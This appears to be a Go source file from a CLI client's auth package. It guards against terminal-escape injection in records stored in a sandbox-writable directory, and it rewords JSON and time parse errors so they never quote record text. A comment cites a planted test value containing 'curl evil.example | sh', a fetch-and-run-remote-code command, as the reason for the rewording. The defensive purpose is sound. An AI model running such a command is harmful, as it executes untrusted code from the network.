package auth

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"reflect"
	"strings"
	"time"

	"github.com/jevlinai/jevlin-go/internal/termtext"
)

// The state directory is a writable root of Codex's sandbox (hard invariant
// 19), so a record read back from it is only what the last writer left
// there. status, doctor, connect and mining enable print these records'
// strings to the participant's terminal; a control, format or separator
// character in one (termtext's rule, which takes in C1 and bidi) is a
// terminal escape or a reordered line in jevlin's own output, with
// jevlin's authority behind it. The platform client refuses those
// characters in every field of what it receives that reaches a record
// (pkg/platform: the agent id, the claim link, code and times, the scopes,
// the slots and the last enrollment), and the save side refuses what the
// load side would, so a record this client wrote never holds one, and a
// record that does was not written by it.

// recordTextProblem names the first string in rec, a struct or a pointer to
// one, that holds a character termtext refuses: its JSON name, or "" when
// there is none. It walks by reflection rather than a list of fields every
// string encoding/json can fill: exported fields, pointers and interfaces,
// slices and arrays, nested and embedded structs (an embedded one's fields
// promote even when the embedded type is unexported), and both the keys and
// the values of maps. A string field added to a record later is checked
// without anyone remembering to add it.
func recordTextProblem(rec any) string {
	return textProblemIn(reflect.ValueOf(rec), "")
}

func textProblemIn(v reflect.Value, name string) string {
	switch v.Kind() {
	case reflect.Pointer, reflect.Interface:
		if v.IsNil() {
			return ""
		}
		return textProblemIn(v.Elem(), name)
	case reflect.String:
		if termtext.HasControlChar(v.String()) {
			return name
		}
	case reflect.Slice, reflect.Array:
		for i := 0; i < v.Len(); i++ {
			if p := textProblemIn(v.Index(i), name); p != "" {
				return p
			}
		}
	case reflect.Map:
		// encoding/json fills a map's keys and its values from the file;
		// both are text a record could print.
		iter := v.MapRange()
		for iter.Next() {
			if p := textProblemIn(iter.Key(), name); p != "" {
				return p
			}
			if p := textProblemIn(iter.Value(), name); p != "" {
				return p
			}
		}
	case reflect.Struct:
		t := v.Type()
		for i := 0; i < t.NumField(); i++ {
			f := t.Field(i)
			// An unexported field is not decoded, unless it is an embedded
			// struct: encoding/json promotes an embedded struct's exported
			// fields whatever the embedded type's own name is.
			if !f.IsExported() && !f.Anonymous {
				continue
			}
			// An embedded struct's own name is never used: its fields
			// recurse under their own names. An embedded non-struct is a
			// field encoding/json names after its type, which jsonName is.
			if p := textProblemIn(v.Field(i), jsonName(f)); p != "" {
				return p
			}
		}
	}
	return ""
}

func jsonName(f reflect.StructField) string {
	if tag, _, _ := strings.Cut(f.Tag.Get("json"), ","); tag != "" && tag != "-" {
		return tag
	}
	return f.Name
}

// decodeError is a record that did not decode, described without repeating
// any of its text. encoding/json's and time's errors quote the value they
// failed on: the review planted a health record whose "at" was "SECURITY
// NOTICE: ... curl evil.example | sh", and status and doctor printed the
// parse error, notice and all. The cause stays in the chain for errors.Is
// and errors.As; only the message is the client's own.
type decodeError struct {
	what string
	err  error
}

func (e *decodeError) Error() string { return "auth: decode " + e.what + ": " + decodeProblem(e.err) }

func (e *decodeError) Unwrap() error { return e.err }

// DecodeProblem says why a record did not decode in the client's own words,
// for a caller outside this package that decodes a record of its own in a
// directory a sandboxed command can write (cmd/jevlin's flush stamp).
func DecodeProblem(err error) string { return decodeProblem(err) }

func decodeProblem(err error) string {
	var syntax *json.SyntaxError
	var typ *json.UnmarshalTypeError
	var parse *time.ParseError
	switch {
	case errors.As(err, &syntax):
		return fmt.Sprintf("it is not JSON (at byte %d)", syntax.Offset)
	case errors.As(err, &typ):
		return "a field has the wrong type"
	case errors.As(err, &parse):
		return "a time in it does not parse"
	case errors.Is(err, io.ErrUnexpectedEOF):
		return "it is cut short"
	case strings.HasPrefix(err.Error(), "json: unknown field "):
		// DisallowUnknownFields' error is a plain string quoting the name,
		// and the name is the planter's to choose.
		return "it holds a field this client does not write"
	default:
		return "it does not decode"
	}
}
